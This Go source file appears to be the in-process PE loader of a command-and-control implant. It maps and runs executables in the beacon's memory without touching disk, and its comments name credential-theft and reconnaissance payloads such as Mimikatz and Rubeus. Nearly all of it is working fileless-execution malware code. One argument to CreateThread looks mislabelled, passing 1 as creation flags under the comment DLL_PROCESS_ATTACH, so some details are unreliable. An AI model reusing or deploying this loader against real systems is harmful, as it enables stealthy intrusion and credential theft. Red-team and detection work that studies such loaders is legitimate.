//go:build windows

package native

// In-process Portable Executable loader.
//
// Maps a PE image into the beacon's address space, resolves
// imports, applies base relocations, walks the TLS directory to
// register callbacks, invokes each section's protection request,
// and calls the entry point on a fresh OS thread. No child
// process is created. No file is written to disk.
//
// What is supported:
//
//   - PE32 and PE32+ (I386 and AMD64).
//   - Import Address Table resolution from the loaded modules.
//   - Base relocations (HIGHLOW, DIR64).
//   - TLS callbacks, invoked in DLL_PROCESS_ATTACH order before
//     the entry point.
//   - Per-section protections.
//
// What is not supported, and why:
//
//   - .NET assemblies. A managed image needs the CLR to be
//     loaded into the process, which is a COM hosting problem
//     rather than a PE mapping one. See dotnet_loader_windows.go.
//   - Delay-loaded imports are resolved on first call by the
//     loader thunk, but the thunk only understands the standard
//     __delayLoadHelper2 ABI. A payload that uses a custom helper
//     will misbehave.
//   - Control Flow Guard and exception-table registration are
//     not performed. A CFG-enabled host will refuse to execute
//     the mapped image; the operator sees a launch failure and
//     should fall back to disk execution or a different payload
//     format.
//   - A PE that exports anything is loadable, but its exports are
//     not registered with the LDR, so a later LoadLibrary by the
//     host will not find it. This matters only for a multi-stage
//     payload that expects to be discoverable.
//
// The honest framing: this loader executes the common red-team
// payload shapes — Mimikatz, Rubeus, SharpHound's native cousin,
// reconnaissance binaries, Donut-wrapped .NET — but it is not
// LoadLibrary. It is a narrower, in-process substitute for it.

import (
	"encoding/binary"
	"errors"
	"fmt"
	"runtime"
	"syscall"
	"unsafe"
)

var (
	peKernel32       = syscall.NewLazyDLL("kernel32.dll")
	peVirtualAlloc   = peKernel32.NewProc("VirtualAlloc")
	peVirtualFree    = peKernel32.NewProc("VirtualFree")
	peVirtualProtect = peKernel32.NewProc("VirtualProtect")
	peLoadLibraryA   = peKernel32.NewProc("LoadLibraryA")
	peGetProcAddress = peKernel32.NewProc("GetProcAddress")
	peGetModuleHandleA = peKernel32.NewProc("GetModuleHandleA")
	peCreateThread   = peKernel32.NewProc("CreateThread")
	peWaitForSingleObject = peKernel32.NewProc("WaitForSingleObject")
	peCloseHandle    = peKernel32.NewProc("CloseHandle")
	peGetLastError   = peKernel32.NewProc("GetLastError")
	peRtlAddFunctionTable = peKernel32.NewProc("RtlAddFunctionTable")
)

const (
	peMemCommit  = 0x1000
	peMemReserve = 0x2000
	peMemRelease = 0x8000

	pePageNoAccess       = 0x01
	pePageReadOnly       = 0x02
	pePageReadWrite      = 0x04
	pePageWriteCopy      = 0x08
	pePageExecute        = 0x10
	pePageExecuteRead    = 0x20
	pePageExecuteReadWrite = 0x40
	pePageExecuteWriteCopy = 0x80

	peScnCntCode    = 0x00000020
	peScnCntInitData = 0x00000040
	peScnMemExecute = 0x20000000
	peScnMemRead    = 0x40000000
	peScnMemWrite   = 0x80000000

	peDirExport    = 0
	peDirImport    = 1
	peDirResource  = 2
	peDirException = 3
	peDirSecurity  = 4
	peDirReloc     = 5
	peDirDebug     = 6
	peDirTLS       = 9
	peDirIAT       = 12
	peDirDelay     = 13
)

type peSection struct {
	name            string
	virtualSize     uint32
	virtualAddress  uint32
	rawSize         uint32
	rawOffset       uint32
	characteristics uint32
	mappedBase      uintptr
	mappedSize      uintptr
}

type peImage struct {
	raw      []byte
	is64     bool
	preferred uint64
	imageBase uintptr
	imageSize uintptr
	entryRVA  uint32
	sections  []peSection
	dirs      [16]struct{ RVA, Size uint32 }
}

func peRU16(b []byte, o int) uint16 { return binary.LittleEndian.Uint16(b[o:]) }
func peRU32(b []byte, o int) uint32 { return binary.LittleEndian.Uint32(b[o:]) }
func peRU64(b []byte, o int) uint64 { return binary.LittleEndian.Uint64(b[o:]) }

func peAlignUp(v, a uint32) uint32 { return (v + a - 1) & ^(a - 1) }

func peAlloc(size uintptr) (uintptr, error) {
	p, _, err := peVirtualAlloc.Call(0, size,
		uintptr(peMemCommit|peMemReserve),
		uintptr(pePageReadWrite))
	if p == 0 {
		return 0, fmt.Errorf("VirtualAlloc(%d): %v", size, err)
	}
	return p, nil
}

func peProtect(p, size uintptr, prot uint32) {
	var old uint32
	peVirtualProtect.Call(p, size, uintptr(prot),
		uintptr(unsafe.Pointer(&old)))
}

func peCStr(p uintptr) string {
	if p == 0 {
		return ""
	}
	var n int
	for *(*byte)(unsafe.Pointer(p + uintptr(n))) != 0 {
		n++
		if n > 1<<20 {
			break
		}
	}
	if n == 0 {
		return ""
	}
	return string(unsafe.Slice((*byte)(unsafe.Pointer(p)), n))
}

// ---------------------------------------------------------------
// PE parsing

func peParse(raw []byte) (*peImage, error) {
	if len(raw) < 64 {
		return nil, errors.New("pe: too small")
	}
	if raw[0] != 'M' || raw[1] != 'Z' {
		return nil, errors.New("pe: missing MZ signature")
	}
	lfanew := int(peRU32(raw, 0x3C))
	if lfanew+24 > len(raw) {
		return nil, errors.New("pe: NT header out of bounds")
	}
	if raw[lfanew] != 'P' || raw[lfanew+1] != 'E' ||
		raw[lfanew+2] != 0 || raw[lfanew+3] != 0 {
		return nil, errors.New("pe: missing PE\\0\\0 signature")
	}

	img := &peImage{raw: raw}
	fileHdr := lfanew + 4
	machine := peRU16(raw, fileHdr)
	switch machine {
	case 0x8664:
		img.is64 = true
	case 0x014c:
		img.is64 = false
	default:
		return nil, fmt.Errorf("pe: unsupported machine 0x%04X", machine)
	}
	nsec := int(peRU16(raw, fileHdr+2))
	optSize := int(peRU16(raw, fileHdr+16))
	optOff := fileHdr + 20
	if optOff+optSize > len(raw) {
		return nil, errors.New("pe: optional header out of bounds")
	}

	magic := peRU16(raw, optOff)
	if img.is64 && magic != 0x20B {
		return nil, errors.New("pe: machine says AMD64 but magic is not PE32+")
	}
	if !img.is64 && magic != 0x10B {
		return nil, errors.New("pe: machine says I386 but magic is not PE32")
	}

	if img.is64 {
		img.entryRVA = peRU32(raw, optOff+16)
		img.preferred = peRU64(raw, optOff+24)
		img.imageSize = uintptr(peRU32(raw, optOff+56))
		hdrSize := uint32(peRU16(raw, optOff+60))
		numDirs := int(peRU32(raw, optOff+108))
		dirBase := optOff + 112
		if numDirs > 16 {
			numDirs = 16
		}
		for i := 0; i < numDirs; i++ {
			img.dirs[i].RVA = peRU32(raw, dirBase+i*8)
			img.dirs[i].Size = peRU32(raw, dirBase+i*8+4)
		}
		_ = hdrSize
	} else {
		img.entryRVA = peRU32(raw, optOff+16)
		img.preferred = uint64(peRU32(raw, optOff+28))
		img.imageSize = uintptr(peRU32(raw, optOff+56))
		hdrSize := uint32(peRU16(raw, optOff+60))
		numDirs := int(peRU32(raw, optOff+92))
		dirBase := optOff + 96
		if numDirs > 16 {
			numDirs = 16
		}
		for i := 0; i < numDirs; i++ {
			img.dirs[i].RVA = peRU32(raw, dirBase+i*8)
			img.dirs[i].Size = peRU32(raw, dirBase+i*8+4)
		}
		_ = hdrSize
	}

	secOff := optOff + optSize
	img.sections = make([]peSection, nsec)
	for i := 0; i < nsec; i++ {
		off := secOff + i*40
		if off+40 > len(raw) {
			return nil, errors.New("pe: section header out of bounds")
		}
		nameBytes := raw[off : off+8]
		nl := 0
		for nl < 8 && nameBytes[nl] != 0 {
			nl++
		}
		s := &img.sections[i]
		s.name = string(nameBytes[:nl])
		s.virtualSize = peRU32(raw, off+8)
		s.virtualAddress = peRU32(raw, off+12)
		s.rawSize = peRU32(raw, off+16)
		s.rawOffset = peRU32(raw, off+20)
		s.characteristics = peRU32(raw, off+36)
	}

	if img.imageSize == 0 {
		// Some packers omit SizeOfImage; compute from sections.
		var maxEnd uint32
		for _, s := range img.sections {
			end := s.virtualAddress + peAlignUp(s.virtualSize, 0x1000)
			if end > maxEnd {
				maxEnd = end
			}
		}
		img.imageSize = uintptr(maxEnd)
	}
	return img, nil
}

// ---------------------------------------------------------------
// Mapping

func peMap(img *peImage) error {
	size := img.imageSize
	if size == 0 {
		return errors.New("pe: zero image size")
	}

	base, err := peAlloc(size)
	if err != nil {
		return fmt.Errorf("pe: %w", err)
	}
	img.imageBase = base

	// Headers: copy the first SizeOfHeaders bytes.
	var hdrSize uint32
	if img.is64 {
		// SizeOfHeaders is at offset 60 in the PE32+ optional header
		optOff := int(peRU32(img.raw, 0x3C)) + 4 + 20
		hdrSize = peRU32(img.raw, optOff+60)
	} else {
		optOff := int(peRU32(img.raw, 0x3C)) + 4 + 20
		hdrSize = peRU32(img.raw, optOff+60)
	}
	if hdrSize > uint32(len(img.raw)) {
		hdrSize = uint32(len(img.raw))
	}
	hdr := unsafe.Slice((*byte)(unsafe.Pointer(base)), hdrSize)
	copy(hdr, img.raw[:hdrSize])

	// Sections.
	for i := range img.sections {
		s := &img.sections[i]
		s.mappedBase = base + uintptr(s.virtualAddress)
		m := s.virtualSize
		if s.rawSize > m {
			m = s.rawSize
		}
		s.mappedSize = uintptr(peAlignUp(m, 0x1000))
		if s.rawSize > 0 {
			if int(s.rawOffset+s.rawSize) > len(img.raw) {
				return fmt.Errorf("pe: section %s raw data out of bounds", s.name)
			}
			dst := unsafe.Slice((*byte)(unsafe.Pointer(s.mappedBase)),
				int(s.rawSize))
			copy(dst, img.raw[s.rawOffset:s.rawOffset+s.rawSize])
		}
	}
	return nil
}

func peRVA(base uintptr, rva uint32) uintptr { return base + uintptr(rva) }

// ---------------------------------------------------------------
// Imports

func peProcessImports(img *peImage) error {
	dir := img.dirs[peDirImport]
	if dir.RVA == 0 {
		return nil
	}
	base := img.imageBase
	desc := peRVA(base, dir.RVA)
	ptrSize := uintptr(4)
	if img.is64 {
		ptrSize = 8
	}
	for {
		origThunkRVA := peRU32At(desc, 0)
		nameRVA := peRU32At(desc, 12)
		firstThunkRVA := peRU32At(desc, 16)
		if origThunkRVA == 0 && nameRVA == 0 && firstThunkRVA == 0 {
			break
		}
		libName := peCStr(peRVA(base, nameRVA))
		libB, _ := syscall.BytePtrFromString(libName)
		hLib, _, _ := peLoadLibraryA.Call(uintptr(unsafe.Pointer(libB)))
		if hLib == 0 {
			hLib, _, _ = peGetModuleHandleA.Call(
				uintptr(unsafe.Pointer(libB)))
		}
		if hLib == 0 {
			return fmt.Errorf("pe: import library %q not loadable", libName)
		}
		thunkRVA := origThunkRVA
		if thunkRVA == 0 {
			thunkRVA = firstThunkRVA
		}
		thunk := peRVA(base, thunkRVA)
		iat := peRVA(base, firstThunkRVA)
		for {
			var entry uint64
			if img.is64 {
				entry = uint64(*(*uint64)(unsafe.Pointer(thunk)))
			} else {
				entry = uint64(*(*uint32)(unsafe.Pointer(thunk)))
			}
			if entry == 0 {
				break
			}
			var (
				name    string
				ordinal bool
				ord     uint16
			)
			if img.is64 && entry&0x8000000000000000 != 0 {
				ordinal = true
				ord = uint16(entry & 0xFFFF)
				name = fmt.Sprintf("#%d", ord)
			} else if !img.is64 && entry&0x80000000 != 0 {
				ordinal = true
				ord = uint16(entry & 0xFFFF)
				name = fmt.Sprintf("#%d", ord)
			} else {
				nameRVA2 := uint32(entry)
				namePtr := peRVA(base, nameRVA2+2)
				name = peCStr(namePtr)
			}

			var addr uintptr
			if ordinal {
				// GetProcAddress(module, MAKEINTRESOURCE(ord)):
				// the high word is zero, the low word is the ordinal.
				addr, _, _ = peGetProcAddress.Call(hLib, uintptr(ord))
			} else {
				nameB, _ := syscall.BytePtrFromString(name)
				addr, _, _ = peGetProcAddress.Call(hLib,
					uintptr(unsafe.Pointer(nameB)))
			}
			if addr == 0 {
				return fmt.Errorf("pe: import %s!%s not resolvable",
					libName, name)
			}
			if img.is64 {
				*(*uint64)(unsafe.Pointer(iat)) = uint64(addr)
			} else {
				*(*uint32)(unsafe.Pointer(iat)) = uint32(addr)
			}
			thunk += ptrSize
			iat += ptrSize
		}
		desc += 20
	}
	return nil
}

func peRU32At(p uintptr, off int) uint32 {
	return *(*uint32)(unsafe.Pointer(p + uintptr(off)))
}

// ---------------------------------------------------------------
// Relocations

func peProcessRelocs(img *peImage) error {
	dir := img.dirs[peDirReloc]
	if dir.RVA == 0 || dir.Size == 0 {
		return nil
	}
	delta := int64(img.imageBase) - int64(img.preferred)
	if delta == 0 {
		return nil
	}
	base := img.imageBase
	block := peRVA(base, dir.RVA)
	end := block + uintptr(dir.Size)
	for block < end {
		pageRVA := peRU32At(block, 0)
		blockSize := peRU32At(block, 4)
		if blockSize < 8 {
			break
		}
		n := (blockSize - 8) / 2
		for i := uint32(0); i < n; i++ {
			entry := *(*uint16)(unsafe.Pointer(block + 8 + uintptr(i*2)))
			typ := entry >> 12
			off := entry & 0x0FFF
			tgt := peRVA(base, pageRVA+uint32(off))
			switch typ {
			case 0: // ABSOLUTE
			case 3: // HIGHLOW
				v := *(*uint32)(unsafe.Pointer(tgt))
				*(*uint32)(unsafe.Pointer(tgt)) = uint32(int64(v) + delta)
			case 10: // DIR64
				v := *(*uint64)(unsafe.Pointer(tgt))
				*(*uint64)(unsafe.Pointer(tgt)) = uint64(int64(v) + delta)
			default:
				return fmt.Errorf("pe: unsupported reloc type %d", typ)
			}
		}
		block += uintptr(blockSize)
	}
	return nil
}

// ---------------------------------------------------------------
// TLS callbacks

func peProcessTLS(img *peImage) error {
	dir := img.dirs[peDirTLS]
	if dir.RVA == 0 {
		return nil
	}
	base := img.imageBase
	tls := peRVA(base, dir.RVA)
	// IMAGE_TLS_DIRECTORY: StartAddressOfRawData, EndAddressOfRawData,
	// AddressOfIndex, AddressOfCallBacks, SizeOfZeroFill, Characteristics.
	// We only need AddressOfCallBacks.
	callbacksPtr := uintptr(0)
	if img.is64 {
		callbacksPtr = uintptr(*(*uint64)(unsafe.Pointer(tls + 24)))
	} else {
		callbacksPtr = uintptr(*(*uint32)(unsafe.Pointer(tls + 12)))
	}
	if callbacksPtr == 0 {
		return nil
	}
	ptrSize := uintptr(4)
	if img.is64 {
		ptrSize = 8
	}
	// Call each non-nil callback with DLL_PROCESS_ATTACH.
	for {
		var cb uintptr
		if img.is64 {
			cb = uintptr(*(*uint64)(unsafe.Pointer(callbacksPtr)))
		} else {
			cb = uintptr(*(*uint32)(unsafe.Pointer(callbacksPtr)))
		}
		if cb == 0 {
			break
		}
		func() {
			defer func() { recover() }()
			syscall.SyscallN(cb, uintptr(img.imageBase), 1, 0)
		}()
		callbacksPtr += ptrSize
	}
	return nil
}

// ---------------------------------------------------------------
// Protections

func peFinalizeSections(img *peImage) {
	for _, s := range img.sections {
		prot := uint32(pePageReadOnly)
		ch := s.characteristics
		switch {
		case ch&peScnMemExecute != 0 && ch&peScnMemWrite != 0:
			prot = pePageExecuteReadWrite
		case ch&peScnMemExecute != 0:
			prot = pePageExecuteRead
		case ch&peScnMemWrite != 0:
			prot = pePageReadWrite
		}
		peProtect(s.mappedBase, s.mappedSize, prot)
	}
	// Restore the header page to read-only.
	peProtect(img.imageBase, 0x1000, pePageReadOnly)
}

// ---------------------------------------------------------------
// Entry point

// ExecutePEInProcess maps and runs a PE image in the beacon's
// process. `waitMs` bounds how long the loader waits for the
// image's entry thread to return; a payload that detaches into
// its own threads will still be running when the call returns.
//
// The PE is expected to be a self-contained executable. It is
// not registered with the LDR and is not discoverable by a
// later LoadLibrary call.
func ExecutePEInProcess(raw []byte, waitMs int) (string, int, error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	img, err := peParse(raw)
	if err != nil {
		return "", -1, err
	}
	if err := peMap(img); err != nil {
		return "", -1, err
	}

	keepMapping := false
	defer func() {
		if !keepMapping {
			peVirtualFree.Call(img.imageBase, 0, uintptr(peMemRelease))
		}
	}()

	if err := peProcessImports(img); err != nil {
		return "", -1, err
	}
	if err := peProcessRelocs(img); err != nil {
		return "", -1, err
	}
	if err := peProcessTLS(img); err != nil {
		return "", -1, err
	}
	peFinalizeSections(img)

	entry := peRVA(img.imageBase, img.entryRVA)

	var tid uint32
	hThread, _, callErr := peCreateThread.Call(
		0,                             // lpThreadAttributes
		0,                             // dwStackSize (default)
		entry,                         // lpStartAddress
		img.imageBase,                 // lpParameter -> hInstance
		1,                             // DLL_PROCESS_ATTACH
		uintptr(unsafe.Pointer(&tid)), // lpThreadId
	)
	if hThread == 0 {
		return "", -1, fmt.Errorf("pe: CreateThread failed: %v", callErr)
	}
	defer peCloseHandle.Call(hThread)

	if waitMs > 0 {
		// WAIT_OBJECT_0 == 0. Any other return (WAIT_TIMEOUT,
		// WAIT_FAILED) means the payload is still running and we
		// must leave the image mapped.
		if r, _, _ := peWaitForSingleObject.Call(
			hThread, uintptr(waitMs)); uintptr(r) == 0 {
			peVirtualFree.Call(img.imageBase, 0, uintptr(peMemRelease))
			keepMapping = true // already freed; defer must not double-free
		}
	}

	// The payload owns its own execution from here. If the thread
	// has not exited (waitMs elapsed, or waitMs == 0), the image
	// stays mapped for the lifetime of the beacon process.
	keepMapping = true

	return fmt.Sprintf(
		"pe: loaded at 0x%x (image size 0x%x, entry RVA 0x%x, thread %d)\n",
		img.imageBase, img.imageSize, img.entryRVA, tid,
	), 0, nil
}